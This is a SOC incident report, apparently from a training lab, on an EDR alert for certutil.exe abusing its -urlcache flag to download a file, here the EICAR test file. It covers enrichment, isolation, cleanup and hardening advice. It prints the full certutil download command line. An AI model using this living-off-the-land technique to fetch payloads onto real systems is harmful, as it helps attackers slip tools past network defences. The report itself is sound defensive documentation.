# Incident Investigation Report: INC-2026-001

* **Incident ID:** INC-2026-001
* **Date / Time Detected:** 2026-09-22 15:42:10 UTC
* **Severity Level:** High (P2)
* **Assigned Analyst:** Dil Mahmud Khan (SOC Tier 1 Analyst)
* **Status:** Resolved & Closed
* **Incident Classification:** Ingress Tool Transfer / LOLBAS Abuse (MITRE ATT&CK: T1105)

---

## 1. Executive Summary

At 15:42:10 UTC, an automated high-severity alert fired from the **LimaCharlie EDR** sensor on endpoint `WIN10-ENT-LAB`. The alert detected the native Windows utility `certutil.exe` being invoked with arguments typically used to download unauthorized external files (`-urlcache -split -f`). The SOAR automation pipeline enriched the file hash via VirusTotal, confirming a high threat reputation. The endpoint was placed into network isolation via the EDR API to prevent potential second-stage malware execution. The downloaded artifact was removed, and the endpoint was successfully verified clean and restored.

---

## 2. Alert & Telemetry Evidence

| Telemetry Attribute | Observed Value |
| :--- | :--- |
| **Affected Endpoint** | `WIN10-ENT-LAB` (IP: `192.168.56.105`) |
| **Logged User** | `DESKTOP-TEST\DilMahmud` |
| **Process Name** | `C:\Windows\System32\certutil.exe` |
| **Process ID (PID)** | `4928` |
| **Parent Process** | `C:\Windows\System32\cmd.exe` (PID: `3812`) |
| **Full Command Line** | `certutil.exe -urlcache -split -f https://secure.eicar.org/eicar.com C:\LabAttacks\payload_certutil.tmp` |
| **SHA-256 Hash** | `275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f` |

---

## 3. Threat Intelligence Enrichment (VirusTotal API)

Through our automated SOAR pipeline, the SHA-256 hash was sent to the **VirusTotal v3 API**:
* **VirusTotal Detections:** 58 / 72 security vendors flagged the hash as malicious.
* **Threat Classification:** `EICAR-Test-Signature` / Downloader artifact.
* **Enrichment Conclusion:** True Positive. The downloaded file is confirmed malicious/suspicious.

---

## 4. Investigative Analysis

1. **Behavioral Analysis:**  
   `certutil.exe` is a legitimate Windows utility designed for certificate management. However, administrators almost never use the `-urlcache` flag in combination with `-split` during routine operations. Attackers abuse this feature (Living off the Land) to download tools because built-in Windows binaries often bypass perimeter network blocks.
2. **Process Lineage:**  
   Inspection of the process tree showed `cmd.exe` launched directly by user session, followed by `certutil.exe`.
3. **Network Connection:**  
   LimaCharlie network socket telemetry recorded an outbound HTTPS connection from `certutil.exe` to external IP address `89.238.73.97:443`.

---

## 5. Containment & Remediation Actions

* **Containment (15:43:02 UTC):** Analyst reviewed the Slack alert card and clicked **[ Isolate Machine ]**. Tines dispatched an API request to LimaCharlie. The sensor immediately blocked all local and external TCP/UDP traffic.
* **Eradication (15:45:30 UTC):** Connected to the isolated host via the LimaCharlie remote shell console. Navigated to `C:\LabAttacks\` and securely deleted the downloaded temporary file `payload_certutil.tmp`.
* **Verification (15:48:15 UTC):** Ran an on-demand process and file scan. No persistent scheduled tasks, registry Run keys, or active network connections were detected.
* **Recovery (15:50:00 UTC):** Lifted network isolation via the EDR dashboard. Endpoint returned to normal operation.

---

## 6. Recommendations & Lessons Learned

1. **Endpoint Hardening:** Implement Windows Defender Application Control (WDAC) or AppLocker rules to block `certutil.exe` from initiating outbound network connections.
2. **Detection Rule Tuning:** Maintain the custom LimaCharlie rule `lolbas_certutil.yaml` to ensure any usage of `-urlcache` on corporate endpoints generates an immediate P2 ticket.
